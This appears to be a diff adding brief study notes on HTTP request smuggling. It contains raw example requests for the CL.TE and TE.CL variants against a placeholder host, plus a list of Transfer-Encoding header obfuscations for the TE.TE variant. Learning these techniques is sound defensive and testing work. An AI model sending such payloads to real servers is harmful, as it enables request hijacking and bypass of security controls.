@@ -1,0 +1,60 @@
+Two headers   which mark the end of an http request.
+
+Transfer encoding
+
+Content Length
+
+
+
+
+
+
+Three scenerio's for smuggling attacks
+
+1)CL & TE
+
+ POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED 
+
+
+2)  TE & CL
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+
+
+3) TE & TE
+
+
+ There are potentially endless ways to obfuscate the Transfer-Encoding header. For example:
+
+Transfer-Encoding: xchunked
+
+Transfer-Encoding : chunked
+
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+Transfer-Encoding:[tab]chunked
+
+[space]Transfer-Encoding: chunked
+
+X: X[\n]Transfer-Encoding: chunked
+
+Transfer-Encoding
+: chunked
+
+
+
